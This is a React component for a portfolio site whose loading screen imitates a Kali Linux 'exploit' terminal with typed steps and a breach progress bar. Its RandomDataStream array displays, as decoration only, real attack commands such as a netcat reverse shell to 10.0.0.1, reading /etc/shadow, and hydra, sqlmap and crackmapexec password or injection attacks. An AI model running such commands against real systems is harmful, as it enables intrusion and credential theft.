import { useState, useEffect, useRef, lazy, Suspense } from 'react';
import { gsap } from 'gsap';
import GridScan from './components/Gridscan';

// Lazy load main content for better performance
const MainContent = lazy(() => import('./components/MainContent'));

const hackingSteps = [
  { text: 'Initializing secure connection...', status: 'DONE' },
  { text: 'Reconing the target...', status: 'DONE' },
  { text: 'Scanning open ports...', status: 'DONE' },
  { text: 'Finding vulnerabilities...', status: 'DONE' },
  { text: 'Exploit successful', status: 'ACCESS GRANTED' },
];

const App = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(0);
  const [displayedText, setDisplayedText] = useState('');
  const [showStatus, setShowStatus] = useState(false);
  const [progress, setProgress] = useState(0);
  
  const containerRef = useRef(null);
  const progressBarRef = useRef(null);

  // Typing effect for each step
  useEffect(() => {
    if (!isLoading) return;
    
    if (currentStep >= hackingSteps.length) {
      setTimeout(() => {
        // Exit animation
        gsap.to(containerRef.current, {
          opacity: 0,
          scale: 1.1,
          filter: 'blur(10px)',
          duration: 0.8,
          ease: 'power2.inOut',
          onComplete: () => setIsLoading(false),
        });
      }, 800);
      return;
    }

    const step = hackingSteps[currentStep];
    let charIndex = 0;
    setDisplayedText('');
    setShowStatus(false);

    const typeInterval = setInterval(() => {
      if (charIndex <= step.text.length) {
        setDisplayedText(step.text.slice(0, charIndex));
        charIndex++;
      } else {
        clearInterval(typeInterval);
        setShowStatus(true);
        
        // Update progress
        const newProgress = ((currentStep + 1) / hackingSteps.length) * 100;
        if (progressBarRef.current) {
          gsap.to(progressBarRef.current, {
            width: `${newProgress}%`,
            duration: 0.5,
            ease: 'power2.out',
          });
        }
        setProgress(newProgress);

        // Move to next step
        setTimeout(() => {
          setCurrentStep(prev => prev + 1);
        }, 600);
      }
    }, 40);

    return () => clearInterval(typeInterval);
  }, [currentStep, isLoading]);

  return (
    <div className="min-h-screen bg-black text-white">
      {/* Loading Screen */}
      {isLoading && (
        <div
          ref={containerRef}
          className="fixed inset-0 z-50 bg-black overflow-hidden"
        >
          {/* GridScan Background */}
          <div className="absolute inset-0 w-full h-full">
            <GridScan
              sensitivity={0.55}
              lineThickness={1}
              linesColor="#0a1f0a"
              gridScale={0.1}
              scanColor="#00ff41"
              scanOpacity={0.4}
              enablePost={true}
              bloomIntensity={0.6}
              chromaticAberration={0.002}
              noiseIntensity={0.01}
            />
          </div>

          {/* Scanlines Overlay */}
          <div 
            className="absolute inset-0 pointer-events-none opacity-30"
            style={{
              background: 'repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 65, 0.03) 2px, rgba(0, 255, 65, 0.03) 4px)',
            }}
          />

          {/* Terminal Container */}
          <div className="absolute inset-0 flex items-center justify-center p-4">
            <div
              className="w-full max-w-3xl bg-[#0d0d1a]/90 border border-[#00ff41]/30 rounded-lg overflow-hidden backdrop-blur-sm"
              style={{
                boxShadow: '0 0 40px rgba(0, 255, 65, 0.15), inset 0 0 60px rgba(0, 255, 65, 0.05)',
              }}
            >
              {/* Terminal Header - Kali Linux Style */}
              <div className="flex items-center gap-1 px-4 py-3 bg-[#1a1a2e] border-b border-[#00ff41]/20">
                <div className="flex items-center">
                  <span className="text-[#00ff41] font-bold text-sm">pradeep</span>
                  <span className="text-white/60 text-sm">@</span>
                  <span className="text-[#00ff41] font-bold text-sm">kali</span>
                  <span className="text-white/40 text-sm mx-1">:</span>
                  <span className="text-[#5c8aff] text-sm font-bold">~</span>
                  <span className="text-white/60 text-sm ml-1">$</span>
                </div>
                <span className="ml-2 text-white/90 text-sm font-mono">
                  ./exploit.sh --target portfolio --mode stealth
                </span>
              </div>

              {/* Terminal Body */}
              <div className="p-8 font-mono text-base min-h-[400px]">
                {/* Completed Steps */}
                {hackingSteps.slice(0, currentStep).map((step, index) => (
                  <div key={index} className="flex items-center gap-2 mb-2 text-[#00ff41]/80">
                    <span className="text-[#00ff41]">[*]</span>
                    <span>{step.text}</span>
                    <span className="ml-auto text-green-400">[{step.status}]</span>
                  </div>
                ))}

                {/* Current Step */}
                {currentStep < hackingSteps.length && (
                  <div className="flex items-center gap-2 text-[#00ff41]">
                    <span className="animate-pulse">[*]</span>
                    <span>{displayedText}</span>
                    <span className="animate-pulse">_</span>
                    {showStatus && (
                      <span className="ml-auto text-green-400 animate-pulse">
                        [{hackingSteps[currentStep].status}]
                      </span>
                    )}
                  </div>
                )}

                {/* Progress Bar */}
                <div className="mt-8">
                  <div className="flex justify-between text-[#00ff41]/60 text-xs mb-2">
                    <span>SYSTEM BREACH PROGRESS</span>
                    <span>{Math.round(progress)}%</span>
                  </div>
                  <div className="h-2 bg-[#0a1f0a] rounded-full overflow-hidden border border-[#00ff41]/20">
                    <div
                      ref={progressBarRef}
                      className="h-full bg-gradient-to-r from-[#00ff41] to-[#00ff41]/70 rounded-full"
                      style={{
                        width: '0%',
                        boxShadow: '0 0 10px #00ff41, 0 0 20px #00ff41',
                      }}
                    />
                  </div>
                </div>

                {/* Hacking Commands Stream */}
                <div className="mt-8 text-[#00ff41]/70 text-xs overflow-hidden border-t border-[#00ff41]/10 pt-4">
                  <div className="text-[#00ff41]/40 mb-2 text-xs uppercase tracking-wider">Live Terminal Feed</div>
                  <RandomDataStream />
                </div>
              </div>
            </div>
          </div>

          {/* Corner Decorations */}
          <div className="absolute top-4 left-4 text-[#00ff41]/50 font-mono text-xs">
            <div>IP: 192.168.1.{Math.floor(Math.random() * 255)}</div>
            <div>PORT: {3000 + Math.floor(Math.random() * 1000)}</div>
          </div>
          <div className="absolute top-4 right-4 text-[#00ff41]/50 font-mono text-xs text-right">
            <div>PACKETS: {Math.floor(Math.random() * 9999)}</div>
            <div>LATENCY: {Math.floor(Math.random() * 50)}ms</div>
          </div>
        </div>
      )}
      
      {/* Main Content */}
      {!isLoading && (
        <Suspense fallback={
          <div className="min-h-screen bg-black flex items-center justify-center">
            <div className="text-[#00ff41] font-mono animate-pulse">Loading...</div>
          </div>
        }>
          <MainContent />
        </Suspense>
      )}
    </div>
  );
};

// Meaningful hacking commands stream
const RandomDataStream = () => {
  const [lines, setLines] = useState([]);

  const hackingCommands = [
    'nmap -sV -sC -p- 192.168.1.105 --script=vuln',
    'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target',
    'sqlmap -u "http://target/page?id=1" --dbs --batch',
    'msfconsole -q -x "use exploit/multi/handler"',
    'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
    'gobuster dir -u http://target -w /usr/share/dirb/wordlists/common.txt',
    'nikto -h http://target -output scan_results.txt',
    'wpscan --url http://target --enumerate u,p,t',
    'searchsploit apache 2.4.49 | grep -i "remote"',
    'curl -X POST http://target/api/login -d "user=admin&pass=test"',
    'hashcat -m 0 -a 0 hashes.txt wordlist.txt --force',
    'netcat -lvnp 4444 > Listening on 0.0.0.0:4444',
    'python3 exploit.py --target 192.168.1.105 --lhost 10.0.0.1',
    'aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap',
    'metasploit: payload => windows/meterpreter/reverse_tcp',
    'chmod +x reverse_shell.sh && ./reverse_shell.sh',
    'nc -e /bin/bash 10.0.0.1 4444 # reverse shell established',
    'cat /etc/shadow | grep root > Extracting password hashes...',
    'sudo tcpdump -i eth0 -w capture.pcap -c 1000',
    'crackmapexec smb 192.168.1.0/24 -u admin -p password123',
  ];

  useEffect(() => {
    const addLine = () => {
      const cmd = hackingCommands[Math.floor(Math.random() * hackingCommands.length)];
      setLines(prev => {
        const newLines = [...prev, cmd];
        if (newLines.length > 4) newLines.shift();
        return newLines;
      });
    };

    addLine();
    const interval = setInterval(addLine, 800);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="space-y-1">
      {lines.map((line, i) => (
        <div key={i} className="truncate opacity-60 hover:opacity-100 transition-opacity">
          <span className="text-[#00ff41]">$ </span>{line}
        </div>
      ))}
    </div>
  );
};

export default App;